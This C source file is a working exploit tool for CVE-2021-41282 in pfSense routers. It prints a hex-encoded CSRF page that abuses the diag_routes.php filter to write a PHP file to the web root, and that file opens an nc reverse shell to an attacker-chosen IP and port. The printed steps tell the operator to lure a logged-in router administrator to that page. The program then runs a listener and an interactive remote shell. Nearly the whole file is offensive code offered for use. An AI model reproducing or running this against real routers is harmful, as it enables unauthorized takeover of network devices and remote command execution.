/*
 * launch.c
 *
 *  Created on: 3 Sep 2022
 *      Author: bantahacka
 */
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <fcntl.h>
#define IP "0.0.0.0"
#define TGTRTR argv[1]
#define FNAME argv[2]
#define LIP argv[3]
#define LPORT argv[4]
#define HTTP "80"

int check_router(const char *, const char *, const char *, const char *);

int check_router(const char *tgt_rtr, const char *tgt_shell, const char *listen_ip, const char *listen_port)
{
	// Set variables
	char *comp_str = "HTTP/1.1 200 OK";
	struct sockaddr_in svr_addr;
	int clnconn, sockfd, sent, received, total;
	char message[1024] = "", response[4096];

	// Build request that will be sent to the router
	strcat(message, "GET /");
	strcat(message, tgt_shell);
	strcat(message, " HTTP/1.0\r\n\r\n");
	fprintf(stdout, "[*]Sending HTTP GET request to http://%s/%s", tgt_rtr, tgt_shell);

	// Create socket
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if(sockfd == -1)
	{
		fprintf(stderr, "\n[*]socket %s (%d)", strerror(errno), errno);
		return -1;
	}
	svr_addr.sin_family = AF_INET;
	svr_addr.sin_addr.s_addr = inet_addr(tgt_rtr);
	svr_addr.sin_port = htons(atoi(HTTP));

	// Connect to target
	clnconn = connect(sockfd, (struct sockaddr*)&svr_addr, sizeof(svr_addr));
	if(clnconn == 0)
	{
		fprintf(stdout, "\n[*]Connected to %s", tgt_rtr);
	}
	if(clnconn != 0)
	{
		fprintf(stderr, "\n[*]connect: %s (%d)", strerror(errno), errno);
		close(sockfd);
		return -1;
	}

	// Send request
	total = strlen(message);
	int count = 0;
	do
	{
		sent = write(sockfd, message+count, total-count);
		if(sent < 0)
		{
			fprintf(stderr, "\n[*]write: %s (%d)", strerror(errno), errno);
			close(sockfd);
			return -1;
		}
		if(sent == 0)
		{
			break;
		}
		count += sent;
	}
	while (count<total);
	received = recv(sockfd, response, sizeof(response), 0);
	if(received > 0)
	{
		// File exists, tell main to continue
		if(strstr(response, comp_str) != NULL)
		{
			fprintf(stdout, "\n[*]Malicious file exists on %s", tgt_rtr);
			close(sockfd);
			return 0;
		}
		else
		{
			// File does not exist, give operator instructions
			fprintf(stdout, "\n[*]Malicious file does not exist on %s. Has it been deployed to the router yet? If not, carry out the following instructions.", tgt_rtr);
			fprintf(stdout, "\n[*]Host the following payload on a webpage and attempt to get an administrator that is logged in to the router to visit the page:");
			fprintf(stdout, "\n\n<meta name=\"referrer\" content=\"no-referrer\">");
			fprintf(stdout, "\n<script>");
			fprintf(stdout, "\nwindow.location = \"http://%s/diag_routes.php?isAjax=1&filter=.*/!d;};s/Destination/\\\\x3cscript\\\\x3eif\\\\x28location.pathname\\\\x21\\\\x3d\\\\x27\\\\x2f%s\\\\x27\\\\x29\\\\x7blocation\\\\x3d\\\\x27\\\\x2fdiag_routes.php\\\\x27\\\\x7d\\\\x3c\\\\x2fscript\\\\x3e\\\\x3c\\\\x3fphp+exec(\\\\x22rm\\\\x20\\\\x2ftmp\\\\x2ff\\\\x3bmkfifo\\\\x20\\\\x2ftmp\\\\x2ff\\\\x3bcat\\\\x20\\\\x2ftmp\\\\x2ff\\\\x7c\\\\x2fbin\\\\x2fsh\\\\x20\\\\x2di\\\\x20\\\\x7cnc\\\\x20%s\\\\x20%s\\\\x20\\\\x3e\\\\x20\\\\x2ftmp\\\\x2ff\\\\x22)\\\\x3b\\\\x3f\\\\x3e/;w+/usr/local/www/%s%%0a%%23\"", tgt_rtr, tgt_shell, listen_ip, listen_port, tgt_shell);
			fprintf(stdout, "\n</script>");
			fprintf(stdout, "\n\nOnce complete, run this program again.\n");
			close(sockfd);
			return -1;
		}
	}
// Something drastic has gone wrong, close socket and return -1
close(sockfd);
return -1;
}

int main(int argc, char *argv[])
{
	// Set variables and char arrays
    char readbuff[262144];
    char user_input[1024];
    struct sockaddr_in srv, cln;
    int bnd, len, lstn, new_sfd, rd, result, sfd, val;
    fprintf(stdout, " _________________________________________\n\
/ Welcome to CVE-2021-41282 - pfSense RCE \\\n\
\\ tool                                    /\n\
 -----------------------------------------\n\
        \\   ^__^\n\
         \\  (oo)\\_______\n\
            (__)\\       )\\/\\\n\
                ||----w |\n\
                ||     ||\n\
");
    if(argc != 5)
	{
		fprintf(stderr, "\n[*]Usage: %s <target router> <filename on target> <listener ip> <listener port>\n", argv[0]);
		fprintf(stderr, "\n[*]To see help: %s -h or --help\n", argv[0]);
		return -1;
	}

    if(strcmp(TGTRTR, "-h") == 0 || strcmp(TGTRTR, "--help") == 0)
    {
    	fprintf(stdout, "\n[*]Usage: %s <target router> <filename on target> <listener ip> <listener port>\n", argv[0]);
    	fprintf(stdout, "\n[*]Example: %s 10.0.2.1 ev1l.php 10.10.29.100 1337", argv[0]);
    	fprintf(stdout, "\n[*]Filename MUST have the .php extension.\n");
    	return 0;
    }

    // Check the router to see if the payload has been delivered. Exit the program if -1 is returned.
    result = check_router(TGTRTR, FNAME, LIP, LPORT);
    if(result == -1)
    {
    	return -1;
    }

    // Create socket
    sfd = socket(PF_INET, SOCK_STREAM, 0);
    if(sfd == -1)
    {
        fprintf(stderr, "\n[*]socket: %s (%d)", strerror(errno), errno);
        return -1;
    }
    else
    {
        fprintf(stdout, "\n[*]Socket created.");
    }

    // Set socket options
    val = 1;
    result = 0;
    result = setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &val, sizeof(val));
    if(result == -1)
    {
        fprintf(stderr, "\n[*]setsockopt: %s (%d)", strerror(errno), errno);
        close(sfd);
        return -1;
    }
    else
    {
        fprintf(stdout, "\n[*]Address reuse set");
    }
    // Bind socket
    srv.sin_family = PF_INET;
    srv.sin_addr.s_addr = inet_addr(IP);
    srv.sin_port = htons(atoi(LPORT));
    len = sizeof(srv);

    bnd = bind(sfd, (struct sockaddr*)&srv, len);
    if(bnd != 0)
    {
        fprintf(stderr, "\n[*]bind: %s (%d)", strerror(errno), errno);
        close(sfd);
        return -1;
    }
    else
    {
        fprintf(stdout, "\n[*]Socket bound");
    }


    // Listen on port
    lstn = listen(sfd, 10);
    if(lstn == 0)
    {
    	fprintf(stdout, "\n[*]Server listening on %s:%s", IP, LPORT);
    }
    else
    {
    	fprintf(stderr, "\n[*]listen: %s (%d)", strerror(errno), errno);
    	close(sfd);
    	return -1;
    }
    fprintf(stdout, "\n[*]Visit http://%s/%s in a browser to initiate the reverse shell.", TGTRTR, FNAME);
    fprintf(stdout, "\n");
    // Accept new inbound client
    socklen_t len_c = sizeof(cln);
    new_sfd = accept(sfd, (struct sockaddr*)&cln, &len_c);
    if(new_sfd == -1)
    {
        fprintf(stderr, "\n[*]accept: %s (%d)", strerror(errno), errno);
        return -1;
    }
    else
    {
    	// Set client socket to non-blocking
    	fcntl(new_sfd, F_SETFL, fcntl(new_sfd, F_GETFL) | O_NONBLOCK);
        char *ip_c = inet_ntoa(cln.sin_addr);

        fprintf(stdout, "\n[*]New connection from client: %s:%d\n", ip_c, ntohs(cln.sin_port));
        while(1)
        {
        	// Clear memory areas
            memset(readbuff, 0x00, sizeof(readbuff));
            memset(user_input, 0x00, sizeof(user_input));
			read(new_sfd, readbuff, sizeof(readbuff));
			fprintf(stdout, "%s", readbuff);

			// Read operator input
			fgets(user_input, sizeof(user_input), stdin);

			// Send input to target
			int total = strlen(user_input);
			int count = 0;
			do
			{
				int sent = write(new_sfd, user_input+count, total-count);

				// Error on socket
				if(sent < 0)
				{
					fprintf(stderr, "\n[*]write: %s (%d)", strerror(errno), errno);
					continue;
				}

				// Data has finished sending
				if(sent == 0)
				{
					break;
				}
				count += sent;
			}
			while(count < total);


			// Clear read buffer
			memset(readbuff, 0x00, sizeof(readbuff));

			// Read incoming data. Output if data present.
            rd = read(new_sfd, readbuff, sizeof(readbuff));
            if(rd > 0)
            {
                fprintf(stdout, "\n%s", readbuff);
                continue;
            }

            // If client dies, close connection
            else if(rd == 0)
            {
                fprintf(stdout, "\n[*]Client connection closed.\n");
                close(sfd);
                close(new_sfd);
                break;
            }
            else
            {
            	if(rd == -1)
            	{
            		// Handle non-blocking socket error
            		if(errno == 11 || errno == EWOULDBLOCK)
            		{
            			continue;
            		}
            		else
            		{
            			// Handle any other recv error and close socket
            			fprintf(stderr, "\n[*]recv: %s (%d){%d}", strerror(errno), errno, rd);
            			close(sfd);
            			close(new_sfd);
            			break;
            		}
            	}
            }
        }
    }
// Something drastic has gone wrong, close socket and return -1
close(sfd);
return -1;
}
